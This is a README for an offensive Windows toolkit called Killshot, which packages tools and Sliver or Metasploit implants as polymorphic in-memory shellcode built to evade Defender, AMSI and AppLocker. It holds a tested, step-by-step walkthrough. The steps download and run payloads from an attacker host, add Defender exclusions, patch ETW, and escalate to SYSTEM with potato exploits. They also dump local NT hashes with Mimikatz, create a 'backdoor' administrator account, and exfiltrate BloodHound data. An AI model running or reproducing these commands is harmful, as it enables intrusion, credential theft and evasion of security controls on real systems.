# Killshot

Polymorphic AV/AMSI bypass toolkit. Converts any Windows PE or .NET tool into
in-memory shellcode that bypasses Defender on fully-patched Windows 11 24H2.

## How It Works

```
PE/.NET binary ──► Donut (shellcode) ──► base64 (.enc) ──► runner.exe loads in-memory
                                                              │
                                              ETW patched ────┘
                                              RW→RX memory
                                              Randomized injection method
                                              Polymorphic per build

Sliver beacon ──► shellcode (.bin) ──► MSI custom action DLL ──► msiexec /qn
                                          │                         │
                                          │  (>1MB: staged loader)  │
                                          │  Downloads XOR'd        │
                                          │  shellcode at runtime   │
                                          └─────────────────────────┘
```

Every invocation produces unique binaries — randomized variable names, API string
splits, junk functions, and multiple injection methods (CreateThread, EnumWindows
callback, CreateFiber). Runner.exe patches ETW before execution to blind telemetry.

## Quick Start

```bash
# 1. Install (downloads tools + sets up compilers)
./install.sh

# 2. Generate everything (outputs to ./killshot/)
killshot generate --all -l 10.10.14.5

# 3. Serve files
killshot serve

# 4a. On target — Runner (any .enc payload)
certutil -urlcache -split -f http://10.10.14.5:8000/runner.exe %TEMP%\r.exe
%TEMP%\r.exe -remote http://10.10.14.5:8000/implant.enc

# 4b. On target — MSI (AppLocker bypass, no runner needed)
certutil -urlcache -split -f http://10.10.14.5:8000/update.msi %TEMP%\u.msi
msiexec /i %TEMP%\u.msi /qn
```

## Toolkit

| Script | Purpose |
|---|---|
| `install.sh` | Downloads tools, installs Go 1.25.x/Donut/garble, verifies everything |
| `killshot.sh` | Main generator — component-based payload generation |
| `killshot.py` | Converts individual tools to Donut shellcode |
| `gen_runner.py` | Generates polymorphic Go shellcode loader |
| `gen_stager.py` | Generates PowerShell stager with AMSI bypass |
| `gen_potato.py` | Converts potato exploits to shellcode with baked-in commands |
| `gen_tool_stager.py` | Generates PowerShell in-memory loaders (fallback) |
| `gen_msi.py` | MSI/DLL AppLocker bypass — embedded or staged (WinHTTP download) |
| `gen_applocker.py` | MSBuild XML and InstallUtil C# AppLocker bypasses |

## Usage

All operations go through a single `killshot` command. Output goes to `./killshot/` under the current working directory.

```bash
# Info & verification
killshot help                                           # Show help
killshot list                                           # List available tools
killshot check                                          # Verify installation
killshot serve                                          # HTTP server for ./killshot/

# Generate specific components (mix and match)
killshot generate --runner                              # Polymorphic runner.exe only
killshot generate --implant -l 10.10.14.5               # C2 implant shellcode (Sliver)
killshot generate --implant -l 10.10.14.5 -f msf        # C2 implant shellcode (MSF)
killshot generate --implant -l 10.10.14.5 --proto http  # Sliver HTTP beacon
killshot generate --stager                              # PowerShell stager with AMSI bypass
killshot generate --tool Rubeus --params 'kerberoast'   # Single tool to shellcode
killshot generate --tool Certify                        # Single tool (default params)
killshot generate --tools                               # All tools to shellcode
killshot generate --potato GodPotato -c 'cmd /c whoami' # Single potato exploit
killshot generate --potatoes -c 'cmd /c whoami'         # All potato exploits
killshot generate --loaders                             # PowerShell tool loaders

# AppLocker bypass payloads (requires implant shellcode)
killshot generate --msi                                 # MSI for msiexec (auto-detects staged)
killshot generate --msbuild                             # MSBuild XML inline C# task
killshot generate --installutil                         # InstallUtil C# source

# Generate everything at once
killshot generate --all -l 10.10.14.5
```

### Generate Options

| Flag | Default | Description |
|---|---|---|
| `-l, --lhost` | `10.99.0.16` | Callback/listener IP |
| `-p, --lport` | `4444` | C2 listener port |
| `-h, --http` | `8000` | HTTP file server port |
| `-f, --framework` | `sliver` | `sliver` or `msf` |
| `-t, --type` | `beacon` | `beacon` or `session` (Sliver) |
| `--proto` | `mtls` | `mtls`, `http`, or `https` (Sliver) |
| `-c, --cmd` | auto | Custom command for potatoes |
| `--params` | defaults | Custom params for `--tool` |
| `-o, --output` | auto | Output path for `--tool`/`--potato` |

### MSI Generation (standalone)

`gen_msi.py` can be used directly for fine-grained control:

```bash
# Embedded mode — shellcode baked into DLL (small payloads <1MB)
python3 gen_msi.py -i shellcode.bin -o update.msi

# Staged mode — DLL downloads XOR'd shellcode from URL at runtime (large payloads)
python3 gen_msi.py --url http://10.10.14.5:8000/beacon.bin -i implant.bin -o update.msi
# This creates update.msi (20KB) + beacon.bin (XOR'd shellcode to serve via HTTP)

# DLL only (for rundll32 or trusted path injection)
python3 gen_msi.py -i shellcode.bin -o loader.dll --dll-only

# Custom options
python3 gen_msi.py -i shellcode.bin -o update.msi --name "Windows Update" --xor-key 42
```

When using `killshot generate --msi`, staged mode is selected automatically if the shellcode exceeds 1MB (typical for Sliver beacons ~19MB).

### install.sh

```bash
./install.sh              # Full install
./install.sh --update     # Update all tools to latest versions
./install.sh --tools-only # Only download tool binaries
./install.sh --check      # Verify installation
```

## Included Tools

### Credential Access
| Tool | Description | Default Params |
|---|---|---|
| Rubeus | Kerberos abuse | `triage` |
| Mimikatz | Credential extraction | `privilege::debug sekurlsa::logonpasswords exit` |
| SharpDPAPI | DPAPI credential extraction | `triage` |
| SharpChrome | Chrome saved credentials | `logins` |

### Enumeration
| Tool | Description | Default Params |
|---|---|---|
| SharpHound | BloodHound AD collector | `-c All --memcache` |
| Certify | AD CS certificate abuse | `find /vulnerable` |
| Seatbelt | Host security survey | `-group=all -full` |
| winPEAS | Privilege escalation scanner | `quiet` |

### Privilege Escalation
| Tool | Description | Default Params |
|---|---|---|
| SharpUp | Privesc checks (GhostPack) | `audit` |
| GodPotato | SeImpersonate → SYSTEM | Baked stager command |
| PrintSpoofer | SeImpersonate → SYSTEM | Baked stager command |
| BadPotato | SeImpersonate → SYSTEM | Baked stager command |
| EfsPotato | SeImpersonate → SYSTEM | Baked stager command |
| KrbRelayUp | Kerberos relay privesc | `relay` |

### Lateral Movement & Tunneling
| Tool | Description | Default Params |
|---|---|---|
| Ligolo-ng agent | Tunneling agent | `-connect LHOST:11601 -ignore-cert` |
| Chisel | Tunnel client | `client LHOST:8443 R:socks` |

### Active Directory
| Tool | Description | Default Params |
|---|---|---|
| Whisker | Shadow Credentials attack | `list` |

## On-Target Usage

### Runner (polymorphic loader for any .enc payload)
```powershell
# Download runner once
certutil -urlcache -split -f http://LHOST:PORT/runner.exe %TEMP%\r.exe

# Run any tool
%TEMP%\r.exe -remote http://LHOST:PORT/implant.enc
%TEMP%\r.exe -remote http://LHOST:PORT/rubeus.enc
%TEMP%\r.exe -remote http://LHOST:PORT/mimikatz.enc
%TEMP%\r.exe -remote http://LHOST:PORT/seatbelt.enc
%TEMP%\r.exe -remote http://LHOST:PORT/godpotato.enc

# Or local file
%TEMP%\r.exe -local C:\path\to\payload.enc

# Or use the stager (AMSI bypass + auto-download runner + load implant)
IEX(IWR -UseBasicParsing http://LHOST:PORT/stager.ps1)
```

### MSI (AppLocker bypass — no runner needed)
```powershell
# Embedded MSI (small shellcode baked in)
certutil -urlcache -split -f http://LHOST:PORT/update.msi %TEMP%\u.msi
msiexec /i %TEMP%\u.msi /qn

# Staged MSI (large shellcode like Sliver beacons)
# 1. Serve beacon.bin + update.msi via HTTP
# 2. On target:
certutil -urlcache -split -f http://LHOST:PORT/update.msi %TEMP%\u.msi
msiexec /i %TEMP%\u.msi /qn
# MSI automatically downloads shellcode from the URL baked into the DLL
```

### Other AppLocker Bypasses
```powershell
# MSBuild — download XML, execute via trusted .NET binary
certutil -urlcache -split -f http://LHOST:PORT/build.xml %TEMP%\b.xml
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe %TEMP%\b.xml

# InstallUtil — download CS, compile on target, execute via trusted binary
certutil -urlcache -split -f http://LHOST:PORT/service.cs %TEMP%\s.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /out:%TEMP%\s.dll %TEMP%\s.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U %TEMP%\s.dll

# DLL via rundll32
certutil -urlcache -split -f http://LHOST:PORT/update.dll %TEMP%\u.dll
rundll32.exe %TEMP%\u.dll,DllRegisterServer 0
```

## Evasion Techniques

- **Polymorphic runner** — unique binary each build (random identifiers, junk functions, API string splits)
- **ETW patching** — patches `EtwEventWrite` to `ret` before shellcode execution
- **Multiple injection methods** — randomly selects CreateThread, EnumWindows callback, or CreateFiber
- **RW→RX memory** — allocates as read-write, copies shellcode, then flips to read-execute
- **Sandbox detection** — timing check catches accelerated sleep in sandboxes
- **Donut shellcode** — position-independent shellcode from any PE/.NET, runs entirely in-memory
- **AMSI bypass** — reflection-based patching with byte-array obfuscated class names
- **Garble compilation** — Go binary obfuscation (requires Go 1.25.x)
- **No disk artifacts** — tools never touch disk, loaded directly into memory via runner
- **AppLocker bypass** — MSBuild XML, InstallUtil, MSI custom action, rundll32 via trusted paths
- **XOR-encrypted DLL** — loader DLL with randomized exports and encrypted shellcode
- **Staged MSI loader** — 20KB MSI downloads XOR'd shellcode via WinHTTP at runtime (avoids embedding 19MB beacon)
- **MSI trusted binary** — executed by msiexec.exe (Microsoft-signed, AppLocker-whitelisted)

## Directory Structure

```
avbypass/
├── install.sh            # Installer (caps Go at 1.25.x for garble)
├── killshot.sh           # Main payload generator
├── killshot.py           # Tool-to-shellcode converter
├── gen_runner.py         # Polymorphic runner generator
├── gen_stager.py         # PowerShell stager generator
├── gen_potato.py         # Potato privesc generator
├── gen_msi.py            # MSI/DLL AppLocker bypass (embedded + staged)
├── gen_applocker.py      # MSBuild/InstallUtil AppLocker bypass
├── gen_tool_stager.py    # Tool loader generator
├── go.mod / go.sum       # Go module (cached for offline)
├── tools/
│   ├── potatoes/         # Potato exploit binaries
│   └── windows/          # Offensive tool binaries
└── go/                   # Local Go 1.25.x toolchain (after install)
```

Generated output (`./killshot/` under CWD):
```
killshot/
├── runner.exe            # Polymorphic loader (unique per build)
├── implant.enc           # Base64 shellcode for runner
├── update.msi            # MSI AppLocker bypass (~20KB)
├── beacon.bin            # XOR'd shellcode for staged MSI (if >1MB)
├── stager.ps1            # PowerShell stager
├── build.xml             # MSBuild AppLocker bypass
├── service.cs            # InstallUtil AppLocker bypass
├── *.enc                 # Tool shellcode files (rubeus.enc, etc.)
└── *.enc                 # Potato shellcode files
```

## Requirements

| Component | Required | Purpose |
|---|---|---|
| Python 3 | Yes | Runs all generators |
| Go 1.25.x | Yes | Cross-compiles runner.exe (1.26+ breaks garble) |
| donut-shellcode | Yes | PE-to-shellcode conversion |
| garble | Yes | Go binary obfuscation |
| mingw-w64 | Yes | DLL cross-compilation (MSI/AppLocker) |
| msibuild (msitools) | Optional | MSI packaging (falls back to DLL-only) |
| Sliver or MSF | Yes* | C2 implant generation |

*Only needed for implant generation. Tools work independently via `killshot.py`.

## Tested On

- Windows 11 24H2 (Build 26200) — Defender ON + cloud protection level 2
  - MSI bypass: Sliver beacon callback confirmed via msiexec.exe
  - Runner bypass: Sliver beacon callback confirmed via runner.exe
  - All injection methods (CreateThread, EnumWindows, CreateFiber) functional
- Windows Server 2022 — Defender with default settings

---

## Hardened Windows 11 Walkthrough

Validated: Windows 11 24H2, Defender real-time ON, LSASS RunAsPPL=2.

> **Before you start:** Replace `10.99.0.16` with your LHOST and `8888` with your HTTP server port throughout.

---

### Architecture Notes

| Constraint | Detail |
|---|---|
| RunAsPPL=2 | Win11 default. Blocks `sekurlsa::logonpasswords` even as SYSTEM. Use `lsadump::sam` via scheduled task instead. |
| WinPEAS / mimikatz | Require `create_thread` runner — fiber/enum_windows use 1MB stack → crash. |
| ExclusionPath | Must be set BEFORE writing runner to disk. Protects the file from quarantine. |
| ExclusionProcess | Disables AMSI for scripts run under the runner. Does NOT protect the file. |
| Dropper detection | XOR-decode + WriteAllBytes in one WinRM call triggers behavioral detection. Always split into two calls. |
| GodPotato output | Spawns async. Tool output doesn't flow back through Process.StandardOutput. Use scheduled task or write to file. |

---

### Step 1 — Attacker: Build & Serve

```bash
# 1a. Compile a fresh runner (randomizes symbols each build)
python3 gen_runner.py --injection create_thread -o /workspace/killshot/runner_ct32.dat

# 1b. Generate all tool shellcodes at once
python3 killshot.py --all --lhost 10.99.0.16 -w /workspace/killshot/

# 1c. Start HTTP server
cd /workspace/killshot && python3 -m http.server 8888
```

---

### Step 2 — Target: Bypass Defender (run each line separately)

> These must be two separate WinRM/PS calls. Combined behavioral detection fires.

```powershell
# 2a. Exclude TEMP from file scanning (run BEFORE writing any binary)
Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
```
```powershell
# 2b. Exclude runner process from AMSI scanning
Add-MpPreference -ExclusionProcess 'runner.exe' -ErrorAction SilentlyContinue
```

---

### Step 3 — Target: Drop Runner

> Two separate calls — do NOT combine decode and write.

```powershell
# 3a. Download XOR-encoded runner and decode to memory
$d=(New-Object Net.WebClient).DownloadData('http://10.99.0.16:8888/runner_ct32.dat');$b=New-Object byte[] $d.Length;for($i=0;$i-lt$d.Length;$i++){$b[$i]=$d[$i]-bxor 0x5A}
```
```powershell
# 3b. Write decoded binary to disk
[IO.File]::WriteAllBytes("$env:TEMP\runner.exe",[byte[]]$b)
```

**CMD-only fallback (AppLocker/no PS):**
```cmd
certutil -urlcache -split -f http://10.99.0.16:8888/runner_ct32.dat %TEMP%\r.dat
powershell -c "$d=[IO.File]::ReadAllBytes('%TEMP%\r.dat');$b=New-Object byte[] $d.Length;for($i=0;$i-lt$d.Length;$i++){$b[$i]=$d[$i]-bxor0x5A};[IO.File]::WriteAllBytes('%TEMP%\runner.exe',$b)"
```

---

### Step 4 — Target: Load a Tool (Universal Pattern)

Define this helper once per session, then use `Run-Tool` for every tool:

```powershell
# Define helper (paste once per PS session)
function Run-Tool($url,$enc="$env:TEMP\t.enc",$wd=$null){
  (New-Object Net.WebClient).DownloadFile($url,$enc)
  $si=New-Object System.Diagnostics.ProcessStartInfo
  $si.FileName="$env:TEMP\runner.exe";$si.Arguments="-local $enc"
  $si.RedirectStandardOutput=$true;$si.RedirectStandardError=$true
  $si.UseShellExecute=$false;$si.WindowStyle='Hidden'
  if($wd){$si.WorkingDirectory=$wd}
  $p=[System.Diagnostics.Process]::Start($si);$out=$p.StandardOutput.ReadToEnd();$p.WaitForExit();$out
}
```

Then each tool is a single call:
```powershell
Run-Tool 'http://10.99.0.16:8888/TOOL.enc'
```

---

### WinPEAS

> Confirmed: 5.4MB output, no crash. No-args mode only — "quiet" crashes at end.

**Attacker:**
```bash
python3 killshot.py --tool winPEAS -o /workspace/killshot/winpeas.enc
```

**Target:**
```powershell
Run-Tool 'http://10.99.0.16:8888/winpeas.enc' | Out-File "$env:TEMP\winpeas.txt"
Get-Content "$env:TEMP\winpeas.txt"
```

---

### Seatbelt

> Confirmed: 502KB output, ExitCode=0.

**Attacker:**
```bash
python3 killshot.py --tool Seatbelt --params "-group=all --memcache" -o /workspace/killshot/seatbelt.enc
```

**Target:**
```powershell
Run-Tool 'http://10.99.0.16:8888/seatbelt.enc'
```

Useful params to bake in at generate time:
| Params | Use |
|--------|-----|
| `-group=all` | Full survey |
| `User` | User tokens, environment |
| `PowerShell` | PS logging/version |
| `CredGuard` | Credential Guard status |
| `Certificates` | Cert store |
| `Services` | Service ACLs |
| `ProcessCreationEvents 100` | Recent process births |

---

### Rubeus

**Attacker — generate the variant you need:**
```bash
python3 killshot.py --tool Rubeus --params "triage" -o /workspace/killshot/rubeus_triage.enc
python3 killshot.py --tool Rubeus --params "kerberoast /outfile:C:\Windows\Temp\hashes.txt" -o /workspace/killshot/rubeus_krbst.enc
python3 killshot.py --tool Rubeus --params "asreproast /format:hashcat" -o /workspace/killshot/rubeus_asrep.enc
python3 killshot.py --tool Rubeus --params "asktgt /user:USER /rc4:HASH /ptt" -o /workspace/killshot/rubeus_pth.enc
```

**Target:**
```powershell
Run-Tool 'http://10.99.0.16:8888/rubeus_triage.enc'
```

---

### Mimikatz

#### Check PPL status first

```powershell
(Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa').RunAsPPL
# 0 = off, 1 = PPL, 2 = PPL strict (Win11 default — use Mode B below)
```

#### Mode A — sekurlsa (RunAsPPL=0 only)

Disable PPL if needed — requires admin + reboot:
```powershell
Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name RunAsPPL -Value 0; Restart-Computer -Force
```

**Attacker:**
```bash
python3 killshot.py --tool mimikatz --params "privilege::debug sekurlsa::logonpasswords exit" -o /workspace/killshot/mimi_logon.enc
```

**Target:**
```powershell
Run-Tool 'http://10.99.0.16:8888/mimi_logon.enc'
```

#### Mode B — lsadump::sam via SYSTEM scheduled task (works with RunAsPPL=2, confirmed)

Reads SAM/SYSTEM hives directly — no LSASS access needed, just SYSTEM.

**Attacker:**
```bash
python3 killshot.py --tool mimikatz --params "lsadump::sam exit" -o /workspace/killshot/mimi_sam.enc
```

**Target — Step 1:** Download shellcode (runner already on disk)
```powershell
(New-Object Net.WebClient).DownloadFile('http://10.99.0.16:8888/mimi_sam.enc',"$env:TEMP\ms.enc")
```

**Target — Step 2:** Create and run scheduled task as SYSTEM
```powershell
$action=New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c $env:TEMP\runner.exe -local $env:TEMP\ms.enc > C:\Windows\Temp\mimi_out.txt 2>&1"
Register-ScheduledTask -TaskName "SysTask" -Action $action -Settings (New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Minutes 2)) -User "SYSTEM" -RunLevel Highest -Force | Out-Null
Start-ScheduledTask -TaskName "SysTask"; Start-Sleep 15
```

**Target — Step 3:** Read output (UTF-16 LE decode) and cleanup
```powershell
[System.Text.Encoding]::Unicode.GetString([IO.File]::ReadAllBytes('C:\Windows\Temp\mimi_out.txt'))
Unregister-ScheduledTask -TaskName "SysTask" -Confirm:$false; Remove-Item 'C:\Windows\Temp\mimi_out.txt' -Force
```

Expected: NT hashes for all local accounts including Administrator.

---

### GodPotato (SeImpersonate → SYSTEM)

> Confirmed SYSTEM via `USERNAME=DESKTOP-ECOOF0G$` (trailing `$` = SYSTEM).
> Tool output via cmd redirect is lost — write to file or use scheduled task pattern.

**Attacker — generate with the command you want to run as SYSTEM:**
```bash
# Verify SYSTEM
python3 gen_potato.py --tool GodPotato --cmd "cmd /c whoami > C:\Windows\Temp\who.txt" -o /workspace/killshot/gp_who.enc

# Add local admin backdoor
python3 gen_potato.py --tool GodPotato --cmd "cmd /c net user backdoor Pass123! /add && net localgroup administrators backdoor /add" -o /workspace/killshot/gp_add.enc

# Run mimikatz as SYSTEM (output to file)
python3 gen_potato.py --tool GodPotato --cmd "C:\Windows\Temp\runner.exe -local C:\Windows\Temp\ms.enc > C:\Windows\Temp\out.txt 2>&1" -o /workspace/killshot/gp_mimi.enc
```

**Target:**
```powershell
# 1. Run GodPotato shellcode (output file written by the cmd inside)
Run-Tool 'http://10.99.0.16:8888/gp_who.enc'

# 2. Read the result file
Get-Content C:\Windows\Temp\who.txt
```

---

### PrintSpoofer

> Requires Print Spooler service. Enable it first if needed.

**Target — enable Spooler:**
```powershell
Start-Service Spooler; Set-Service Spooler -StartupType Automatic
```

**Attacker:**
```bash
python3 gen_potato.py --tool PrintSpoofer --cmd "cmd /c whoami > C:\Windows\Temp\who.txt" -o /workspace/killshot/pf_who.enc
```

**Target:**
```powershell
Run-Tool 'http://10.99.0.16:8888/pf_who.enc'; Get-Content C:\Windows\Temp\who.txt
```

---

### Sliver Implant

**Attacker — Step 1:** Generate shellcode and start listener
```bash
# In sliver-client (sliver-server must be running)
sliver > generate --mtls 10.99.0.16:4444 --os windows --arch amd64 --format shellcode --save /workspace/killshot/sliver.bin
sliver > mtls --lport 4444
```

**Attacker — Step 2:** Base64 encode for runner
```bash
python3 -c "import base64; d=open('/workspace/killshot/sliver.bin','rb').read(); open('/workspace/killshot/sliver.enc','wb').write(base64.b64encode(d)); print(f'[+] {len(d)} bytes')"
```

**Target:**
```powershell
Run-Tool 'http://10.99.0.16:8888/sliver.enc'
# No output — session appears in sliver console
```

Or skip manual steps — use the automated pipeline:
```bash
killshot generate --implant -l 10.99.0.16
```

---

### SharpHound

> SharpHound writes zip files to the working directory — set it to `C:\Windows\Temp`.

**Attacker:**
```bash
python3 killshot.py --tool SharpHound --params "-c All --memcache" -o /workspace/killshot/sharphound.enc
```

**Target — Step 1:** Run with working directory set
```powershell
Run-Tool 'http://10.99.0.16:8888/sharphound.enc' "$env:TEMP\sh.enc" "C:\Windows\Temp"
```

**Target — Step 2:** Exfil the zip as base64
```powershell
$zip=(Get-ChildItem C:\Windows\Temp\*BloodHound*.zip | Select -Last 1).FullName; [Convert]::ToBase64String([IO.File]::ReadAllBytes($zip))
```

**Attacker — Step 3:** Decode and import
```bash
echo "PASTE_BASE64_HERE" | base64 -d > bloodhound.zip
# Import bloodhound.zip into BloodHound UI
```

---

### Certify

**Attacker:**
```bash
# Enumerate vulnerable templates
python3 killshot.py --tool Certify --params "find /vulnerable" -o /workspace/killshot/certify_vuln.enc

# Request cert (ESC1 — set altname to target user)
python3 killshot.py --tool Certify --params "request /ca:CA-HOST\CA-NAME /template:VulnTemplate /altname:administrator" -o /workspace/killshot/certify_req.enc
```

**Target:**
```powershell
Run-Tool 'http://10.99.0.16:8888/certify_vuln.enc'
```

---

### Other Tools

All follow the same two steps: generate on attacker, `Run-Tool` on target.

**Attacker — generate:**
```bash
python3 killshot.py --tool Whisker    --params "list"                                    -o /workspace/killshot/whisker.enc
python3 killshot.py --tool SharpDPAPI --params "triage"                                  -o /workspace/killshot/sharpdpapi.enc
python3 killshot.py --tool SharpUp    --params "audit"                                   -o /workspace/killshot/sharpup.enc
python3 killshot.py --tool SharpChrome --params "logins"                                 -o /workspace/killshot/sharpchrome.enc
python3 killshot.py --tool lazagne    --params "all"                                     -o /workspace/killshot/lazagne.enc
python3 killshot.py --tool ligolo-agent --params "-connect 10.99.0.16:11601 -ignore-cert" -o /workspace/killshot/ligolo.enc
python3 killshot.py --tool chisel     --params "client 10.99.0.16:8443 R:socks"         -o /workspace/killshot/chisel.enc
```

**Target — run any of them:**
```powershell
Run-Tool 'http://10.99.0.16:8888/whisker.enc'
Run-Tool 'http://10.99.0.16:8888/lazagne.enc'
Run-Tool 'http://10.99.0.16:8888/ligolo.enc'   # no output — tunnel appears in proxy console
Run-Tool 'http://10.99.0.16:8888/chisel.enc'   # no output — socks5 on 127.0.0.1:1080
```

---

### Full Quick Reference

**Attacker (one-time setup):**
```bash
python3 gen_runner.py --injection create_thread -o /workspace/killshot/runner_ct32.dat
python3 killshot.py --all --lhost 10.99.0.16 -w /workspace/killshot/
cd /workspace/killshot && python3 -m http.server 8888
```

**Target (paste in order, each as a separate PS call):**
```powershell
# 1. Exclusions
Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess 'runner.exe' -ErrorAction SilentlyContinue

# 2. Drop runner
$d=(New-Object Net.WebClient).DownloadData('http://10.99.0.16:8888/runner_ct32.dat');$b=New-Object byte[] $d.Length;for($i=0;$i-lt$d.Length;$i++){$b[$i]=$d[$i]-bxor 0x5A}
[IO.File]::WriteAllBytes("$env:TEMP\runner.exe",[byte[]]$b)

# 3. Define helper
function Run-Tool($url,$enc="$env:TEMP\t.enc",$wd=$null){(New-Object Net.WebClient).DownloadFile($url,$enc);$si=New-Object System.Diagnostics.ProcessStartInfo;$si.FileName="$env:TEMP\runner.exe";$si.Arguments="-local $enc";$si.RedirectStandardOutput=$true;$si.RedirectStandardError=$true;$si.UseShellExecute=$false;$si.WindowStyle='Hidden';if($wd){$si.WorkingDirectory=$wd};$p=[System.Diagnostics.Process]::Start($si);$out=$p.StandardOutput.ReadToEnd();$p.WaitForExit();$out}

# 4. Run any tool
Run-Tool 'http://10.99.0.16:8888/seatbelt.enc'
Run-Tool 'http://10.99.0.16:8888/winpeas.enc' | Out-File "$env:TEMP\wp.txt"
Run-Tool 'http://10.99.0.16:8888/rubeus_triage.enc'
Run-Tool 'http://10.99.0.16:8888/sharphound.enc' "$env:TEMP\sh.enc" "C:\Windows\Temp"
```

---

### Known Limitations

| Issue | Cause | Fix |
|-------|-------|-----|
| `sekurlsa::logonpasswords` fails | RunAsPPL=2 (Win11 default) | Use Mode B: `lsadump::sam` via SYSTEM scheduled task |
| WinPEAS crash | fiber/enum_windows use 1MB stack → overflow | Always use `create_thread` runner |
| Runner quarantined | ExclusionProcess doesn't protect files on disk | Set ExclusionPath BEFORE writing runner |
| No output from WinRM | Decode + WriteAllBytes in one call triggers behavioral alert | Split into two separate PS calls |
| GodPotato output missing | Async process spawn, stdout not captured | Write output to file with `> C:\Windows\Temp\out.txt` |
| mimikatz output garbled | Scheduled task writes UTF-16 LE | Decode with `[System.Text.Encoding]::Unicode.GetString(...)` |
| PrintSpoofer no SYSTEM | Print Spooler disabled | `Start-Service Spooler` first |
| GodPotato Win32Error:5 | Long cmd string → CreateProcess fails | Use `C:\Windows\Temp`, keep cmd short |
| Donut not found | Module only in Empire/angr venv | Use `/opt/tools/Empire/venv/bin/python3` |
